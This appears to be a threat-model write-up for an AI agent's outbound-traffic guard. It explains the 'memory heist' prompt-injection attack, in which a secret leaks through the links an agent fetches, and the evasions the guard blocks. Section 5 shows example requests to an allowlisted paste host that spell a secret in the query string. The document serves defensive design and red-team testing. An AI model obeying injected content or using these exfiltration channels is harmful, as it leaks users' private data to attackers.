# Threat Model — Data Exfiltration via the Lethal Trifecta

Scope: the "memory heist" class of attack (Ayush Paul, 2026) and prompt-injection
exfiltration generally. Grounded in `driftcore/kernel/egress_guard.py`,
`GuardedEgress`, `resolve_and_pin`, and `driftcore/verification/cumulative_ledger.py`.
Claims below are demonstrated by `tests/test_redteam_memory_heist.py` (9/9).

## 1. The trifecta

Exfiltration needs three things at once. Any one alone is inert:

1. **Private data** — memory, second brain, files, credentials the agent can read.
2. **Untrusted content** — a fetched page, a Reddit comment link, an image with an
   injected prompt, a calendar invite. Anything the agent ingests that an attacker
   authored.
3. **An outbound sink** — any way to send/post/edit: a fetch, an email, a webhook.

The "memory heist" encodes the secret into *which* links the agent fetches
(`/a /b /c` on the attacker's host) and reads it back from the attacker's server
logs. The secret never appears in a payload — it is carried by the destinations.

## 2. Where the fight actually is

Not stopping *access* — stopping *egress*. The invariant is: **can this leave, and
is it going home?** The video's own mitigation (don't follow more than ~6 links deep)
is rate-limiting a symptom. DriftCore's answer is architectural: **default-deny
egress to a human-declared allowlist, fail-closed.**

## 3. How each precondition is answered

| Precondition | Control | Module |
|---|---|---|
| Outbound sink | Default-deny allowlist of exact `(scheme, host, port)` triples; unconfigured/empty = refuse | `EgressGuard.check`, `EgressPolicy.build` |
| Destination spoofing | Normalize before match: reject userinfo `@`, fold homographs (IDNA), strip trailing dot/case, refuse unreadable | `normalize_destination` |
| SSRF / metadata | Refuse loopback/private/link-local/CGNAT/NAT64/v4-mapped IP space | `is_private_destination` |
| DNS rebinding / TOCTOU | Resolve and pin; verify **every** answer; refuse a name resolving into private space | `resolve_and_pin`, `PinnedDestination` |
| Redirect bypass | No auto-follow; re-check every hop as a fresh destination; finite hop budget | `GuardedEgress.request` |
| High-volume spelling | Cap egress **action count** and burst, not just bytes | `cumulative_ledger.py` |
| Guard bypass | Guard is the *only* path only if the process has no unmediated socket | OS boundary (netns/seccomp/firewall) — **outside this code** |

## 4. Demonstrated (red-team results)

Against the memory-heist pattern and its evasions, all **blocked**: exfil links to an
undeclared attacker host; the userinfo trick; suffix confusion; the cloud-metadata IP;
CGNAT space; a trusted page 302-redirecting to the attacker (refused mid-hop); and a
DNS rebind of an allowlisted name into the metadata address (refused at pin time).

The attack the video describes is defeated in its primary form and every evasion it
names — architecturally, at the destination, not by rate-limiting.

## 5. Residual — the one gap the guard does NOT close

**Exfiltration through an allowlisted host via path/query (or timing).** The guard
matches `(scheme, host, port)` and, by design, ignores path and query. So if the
allowlist contains **any host whose received requests an attacker can observe** — a
pastebin, a URL shortener, an analytics/beacon endpoint, a legitimate host the
attacker has compromised or can read logs of — then:

    https://paste.allowed.com/log?c=j   ALLOW
    https://paste.allowed.com/log?c=u   ALLOW   ...spells the secret in the query.

Demonstrated in section E of the red-team: all six requests permitted, secret carried
out in the query string. Volume caps don't help — a name is a handful of requests, or
one request's path.

This is not a guard bug. It is a **policy-composition hazard**, and it reframes what an
allowlist entry *means*:

> An allowlisted destination is not "a host trusted to be benign." It is a host
> **trusted to RECEIVE your secrets.** Anything the agent can read may end up in the
> path or query of a request to that host.

### Recommended controls for the residual
1. **Allowlist hygiene invariant / lint:** refuse or flag entries that are known
   multi-tenant, attacker-observable, or content-hosting (shorteners, pastebins,
   analytics collectors, generic object stores). Same "normalize then match whole
   tokens" discipline, applied to a deny-category list.
2. **"Home" classification (the video's one good idea, done properly):** tag each
   allowlisted destination as first-party sink vs. third-party API. Free-form data
   (notes, memory contents) may only ride to first-party sinks.
3. **Egress payload minimization:** for third-party APIs, constrain path/query to a
   declared shape rather than allowing arbitrary strings — hard, partial, but it moves
   path/query from "unconstrained channel" toward "declared interface."

## 6. Honest boundaries

- The guard is **defense in depth behind a network boundary, never the boundary
  itself** (its own docstring says so, citing the July 2026 OpenAI/HF proxy zero-day).
  Full closure requires the agent process to have no socket it can use directly.
- Pinning **shrinks** the rebinding window; it does not eliminate it — the connect must
  go to the pinned IP with the original Host header.
- Payload-level exfiltration (secret embedded in a legitimately-shaped request body to
  a first-party sink) is out of scope for a destination guard and needs content
  controls.
